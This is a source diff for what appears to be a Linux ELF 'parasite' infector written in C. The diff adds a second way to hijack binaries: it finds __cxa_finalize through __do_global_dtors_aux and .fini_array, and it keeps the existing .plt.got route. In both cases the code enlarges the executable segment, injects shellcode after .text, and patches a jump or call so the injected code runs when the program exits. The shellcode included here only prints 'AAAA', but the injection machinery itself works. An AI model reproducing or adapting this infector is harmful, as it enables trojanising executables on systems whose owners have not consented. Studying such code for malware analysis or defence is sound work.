@@ -13,21 +13,17 @@
 #include <auxvector.h>
 
 /* TODO
- * - Relying on plt is bad - many system binaries are compiled with
- *   -fno-plt. Need another way to find cxa_finalize (e.g. by partially
- *   disassembling __do_global_dtors_aux).
  * - Custom parasite infection:
  *   * raw shellcode
  *   * object file
- *
  */
-
-#define SHELLCODE_LEN       43
-#define SHELLCODE_JMP_OFFT  37
 
 uint64_t PAGE_SIZE = 0;
 
-uint8_t dummy_shellcode[SHELLCODE_LEN] = {
+#define SHELLCODE_PLTGOT_LEN       43
+#define SHELLCODE_PLTGOT_JMP_OFFT  37
+
+uint8_t dummy_shellcode_pltgot[SHELLCODE_PLTGOT_LEN] = {
   0x57,                                         // push rdi
   0x48, 0xb8, 0x41, 0x41, 0x41, 0x41, 0x0a,     // movabs rax, 0xa41414141
   0x00, 0x00, 0x00,
@@ -42,8 +38,35 @@ uint8_t dummy_shellcode[SHELLCODE_LEN] = {
   0xff, 0x25, 0x00, 0x00, 0x00, 0x00,           // jmp QWORD PTR [rip + ?]
 };
 
+#define SHELLCODE_DTORS_LEN       49
+#define SHELLCODE_DTORS_JMP_OFFT  42
+
+uint8_t dummy_shellcode_dtors[SHELLCODE_DTORS_LEN] = {
+  0x5e,                                         // pop rsi
+  0x48, 0xff, 0xc6,                             // inc rsi
+  0x56,                                         // push rsi
+  0x57,                                         // push rdi
+  0x48, 0xb8, 0x41, 0x41, 0x41, 0x41, 0x0a,     // movabs rax, 0xa41414141
+  0x00, 0x00, 0x00,
+  0x50,                                         // push rax
+  0xb8, 0x01, 0x00, 0x00, 0x00,                 // mov eax, 1
+  0xbf, 0x01, 0x00, 0x00, 0x00,                 // mov edi, 1
+  0x48, 0x89, 0xe6,                             // mov rsi, rsp
+  0xba, 0x05, 0x00, 0x00, 0x00,                 // edx, 5
+  0x0f, 0x05,                                   // syscall
+  0x48, 0x83, 0xc4, 0x08,                       // add rsp, 8
+  0x5f,                                         // pop rdi
+  0xff, 0x25, 0x00, 0x00, 0x00, 0x00,           // jmp QWORD PTR [rip + ?]
+  0xc3,                                         // ret
+};
+
+
 uint8_t jump[5] = {
-    0xe9, 0x44, 0x01, 0x00, 0x00,
+    0xe9, 0x00, 0x00, 0x00, 0x00,
+};
+
+uint8_t call[5] = {
+    0xe8, 0x00, 0x00, 0x00, 0x00,
 };
 
 struct parasite_host {
@@ -60,6 +83,7 @@ struct parasite_host {
     Elf64_Rela *rela_dyn;
     size_t no_rela_dyn;
     char *dyn_str;
+    uint8_t *do_glob_dtors;
     uint8_t *jmp_to_payload;
 
     uint8_t *scratch_space;
@@ -131,9 +155,9 @@ static int map_host(const char *path, struct parasite_host *host)
     close(elf_fd);
 
     host->phdrs = (Elf64_Phdr *)(host->bytes + host->elf->e_phoff);
-    printf("[DEBUG] Program Headers @%p\n", host->phdrs);
+    printf("[DEBUG] Program Headers\t\t@%p\n", host->phdrs);
     host->shdrs = (Elf64_Shdr *)(host->bytes + host->elf->e_shoff);
-    printf("[DEBUG] Section Headers @%p\n", host->shdrs);
+    printf("[DEBUG] Section Headers\t\t@%p\n", host->shdrs);
 
     host->scratch_space = mmap(NULL, host->size,
                           PROT_WRITE | PROT_READ,
@@ -169,6 +193,7 @@ static int find_sections(struct parasite_host *host)
 
     Elf64_Half i;
     char *section_strtab;
+    uint32_t *fini_array;
 
     Elf64_Shdr *sh_strtab = &host->shdrs[host->elf->e_shstrndx];
     section_strtab = (char *)((uint64_t)host->elf+ (uint64_t)sh_strtab->sh_offset);
@@ -178,6 +203,15 @@ static int find_sections(struct parasite_host *host)
         case SHT_DYNSYM:
         host->dyn_sym = (Elf64_Sym *)((uint64_t)host->elf +
                                       (uint64_t)host->shdrs[i].sh_offset);
+        break;
+
+        case SHT_FINI_ARRAY:
+        fini_array = (uint32_t *)((uint64_t)host->elf +
+                                  (uint64_t)host->shdrs[i].sh_offset);
+        if (fini_array && fini_array[0]) {
+            host->do_glob_dtors = (uint8_t *)((uint64_t)host->elf +
+                                              (uint64_t)fini_array[0]);
+        }
         break;
 
         case SHT_PROGBITS:
@@ -201,19 +235,21 @@ static int find_sections(struct parasite_host *host)
         }
     }
 
-    if (!host->dyn_sym || !host->plt_got || !host->rela_dyn || !host->dyn_str) {
+    if (!host->dyn_sym || (!host->do_glob_dtors && !host->plt_got) ||
+        !host->rela_dyn || !host->dyn_str) {
         fprintf(stderr, "find_sections: Candidate host missing a required section\n");
         return -1;
     }
-    printf("[DEBUG] .dyn.sym\t@%p\n", host->dyn_sym);
-    printf("[DEBUG] .rela.dyn\t@%p\n", host->rela_dyn);
-    printf("[DEBUG] No relocs\t%ld\n", host->no_rela_dyn);
-    printf("[DEBUG] .plt.got\t@%p\n", host->plt_got);
-    printf("[DEBUG] .dyn.str\t@%p\n", host->dyn_str);
+    printf("[DEBUG] .dyn.sym\t\t@%p\n", host->dyn_sym);
+    printf("[DEBUG] .rela.dyn\t\t@%p\n", host->rela_dyn);
+    printf("[DEBUG] No relocs\t\t%ld\n", host->no_rela_dyn);
+    printf("[DEBUG] .plt.got\t\t@%p\n", host->plt_got);
+    printf("[DEBUG] .dyn.str\t\t@%p\n", host->dyn_str);
+    printf("[DEBUG] do_glob_dtors\t\t@%p\n", host->do_glob_dtors);
     return 0;
 }
 
-static int find_cxafin(struct parasite_host *host)
+static int find_cxafin_pltgot(struct parasite_host *host)
 {
     uint64_t i;
     Elf64_Sym sym_it;
@@ -241,7 +277,8 @@ static int find_cxafin(struct parasite_host *host)
             saved_offt = *(uint32_t *)&plt_got[i+2];
             if (cxafin_bytes == (&plt_got[i+6] + saved_offt)) {
                 printf("[DEBUG] code offset:\t0x%x\n", saved_offt);
-                memcpy(&dummy_shellcode[SHELLCODE_JMP_OFFT], &plt_got[i], 5);
+                memcpy(&dummy_shellcode_pltgot[SHELLCODE_PLTGOT_JMP_OFFT],
+                       &plt_got[i], 6);
                 host->jmp_to_payload = &plt_got[i];
                 return 0;
             }
@@ -257,6 +294,26 @@ static int mamma_mia(struct parasite_host *host)
     Elf64_Addr infect_vaddr = 0;
     uint8_t *end_of_text;
 
+    uint8_t *dummy_shellcode;
+    size_t shellcode_len,
+           shellcode_jmp_offt;
+    uint32_t inst_len;
+
+
+    if (host->plt_got) {
+        dummy_shellcode = dummy_shellcode_pltgot;
+        shellcode_len = SHELLCODE_PLTGOT_LEN;
+        shellcode_jmp_offt = SHELLCODE_PLTGOT_JMP_OFFT;
+        inst_len = 6;
+    } else if (host->do_glob_dtors) {
+        dummy_shellcode = dummy_shellcode_dtors;
+        shellcode_len = SHELLCODE_DTORS_LEN;
+        shellcode_jmp_offt = SHELLCODE_DTORS_JMP_OFFT;
+        inst_len = 7;
+    } else {
+        return -1;
+    }
+
     for (i=0; i < host->elf->e_phnum; i++) {
         if (host->phdrs[i].p_type == PT_LOAD) {
             if (host->phdrs[i].p_flags & PF_X) {
@@ -270,8 +327,8 @@ static int mamma_mia(struct parasite_host *host)
                                     host->phdrs[i].p_offset -
                                     host->phdrs[i].p_filesz);
 
-                host->phdrs[i].p_filesz += SHELLCODE_LEN;
-                host->phdrs[i].p_memsz += SHELLCODE_LEN;
+                host->phdrs[i].p_filesz += shellcode_len;
+                host->phdrs[i].p_memsz += shellcode_len;
                 for (j=i+1; j < host->elf->e_phnum; j++) {
                     if (host->phdrs[j].p_offset > host->phdrs[i].p_offset)
                         host->phdrs[j].p_offset += PAGE_SIZE;
@@ -286,25 +343,71 @@ static int mamma_mia(struct parasite_host *host)
         }
 
         if (infect_vaddr == (host->shdrs[i].sh_addr + host->shdrs[i].sh_size)) {
-            host->shdrs[i].sh_size += SHELLCODE_LEN;
+            host->shdrs[i].sh_size += shellcode_len;
         }
     }
 
-    uint32_t *rel_cxa_finalize = (uint32_t *)&dummy_shellcode[SHELLCODE_JMP_OFFT+2];
-    *rel_cxa_finalize -= (((uint64_t)end_of_text+SHELLCODE_LEN-6) -
+    uint32_t *rel_cxa_finalize = (uint32_t *)&dummy_shellcode[shellcode_jmp_offt+2];
+    *rel_cxa_finalize -= (((uint64_t)end_of_text+shellcode_len-inst_len) -
                           (uint64_t)host->jmp_to_payload);
 
     memcpy(host->scratch_space, end_of_text, bytes_after_text);
-    memcpy(end_of_text, dummy_shellcode, SHELLCODE_LEN);
+    memcpy(end_of_text, dummy_shellcode, shellcode_len);
     memcpy(end_of_text+PAGE_SIZE, host->scratch_space, bytes_after_text);
     host->elf->e_shoff += PAGE_SIZE;
 
     uint32_t offt = (uint32_t) ((uint64_t)end_of_text -
                                ((uint64_t)host->jmp_to_payload+5));
-    *(uint32_t *)&jump[1] = offt;
-    memcpy(host->jmp_to_payload, jump, 5);
+
+    if (host->plt_got) {
+        *(uint32_t *)&jump[1] = offt;
+        memcpy(host->jmp_to_payload, jump, 5);
+    } else if (host->do_glob_dtors) {
+        *(uint32_t *)&call[1] = offt;
+        memcpy(host->jmp_to_payload, call, 5);
+    } else {
+        return -1;
+    }
 
     return 0;
+}
+
+#define RET 0xc3
+
+const uint8_t qwordcmp[] = { 0x48, 0x83, 0x3d };
+const uint8_t qwordcall[] = { 0xff, 0x15 };
+
+int find_cxafin_dtors(struct parasite_host *host)
+{
+    uint64_t i;
+    uint32_t saved_offt;
+    uint8_t *cxafin_bytes = NULL;
+
+
+    /* this is a shitty but safer way to scan: a stray c3 in code will
+     * ruin our search.
+     * an alternative is to get some context, but you have to be careful
+     * we can go past the ret if the termination is not reliable
+     */
+    for (i=0; host->do_glob_dtors[i+8] != RET; i++) {
+        if (!memcmp(&host->do_glob_dtors[i], qwordcmp, 3)) {
+            saved_offt = *(uint32_t *)&host->do_glob_dtors[i+3];
+            cxafin_bytes = &host->do_glob_dtors[i+8] + saved_offt;
+            printf("[DEBUG][CMP] __cxa_finalize\t@%p\n", cxafin_bytes);
+        }
+
+        if (!memcmp(&host->do_glob_dtors[i], qwordcall, 2)) {
+            saved_offt = *(uint32_t *)&host->do_glob_dtors[i+2];
+            if (cxafin_bytes == &host->do_glob_dtors[i+6] + saved_offt) {
+                printf("[DEBUG] Found __cxa_finalize\t@%p\n", cxafin_bytes);
+                memcpy(&dummy_shellcode_dtors[SHELLCODE_DTORS_JMP_OFFT],
+                       &host->do_glob_dtors[i], 6);
+                host->jmp_to_payload = &host->do_glob_dtors[i];
+                return 0;
+            }
+        }
+    }
+    return -1;
 }
 
 int main(int argc, char **argv)
@@ -331,7 +434,7 @@ int main(int argc, char **argv)
 
     PAGE_SIZE = aux[AT_PAGESZ_ORD].val;
 
-    printf("[DEBUG] Page size:\t%ld\n", PAGE_SIZE);
+    printf("[DEBUG] Page size:\t\t%ld\n", PAGE_SIZE);
 
     memset(&host, 0, sizeof(struct parasite_host));
 
@@ -345,12 +448,24 @@ int main(int argc, char **argv)
         goto free_exit;
     }
 
-    if (find_cxafin(&host) == -1) {
-        fprintf(stderr, "find_cxafin: failed to locate __cxa_finalize()\n");
-        goto free_exit;
+    // Either greedy or argv determined
+    if (host.plt_got) {
+        if (find_cxafin_pltgot(&host) == -1) {
+            fprintf(stderr, "find_cxafin_pltgot: failed to locate __cxa_finalize()\n");
+        }
+        goto infect;
+    }
+
+    if (host.do_glob_dtors) {
+        if (find_cxafin_dtors(&host) == -1) {
+            fprintf(stderr, "find_cxafin_dtors: failed to locate __cxa_finalize()\n");
+            goto free_exit;
+        }
     };
 
+infect:
     mamma_mia(&host);
+
 free_exit:
     unmap_host(&host);
     return 0;
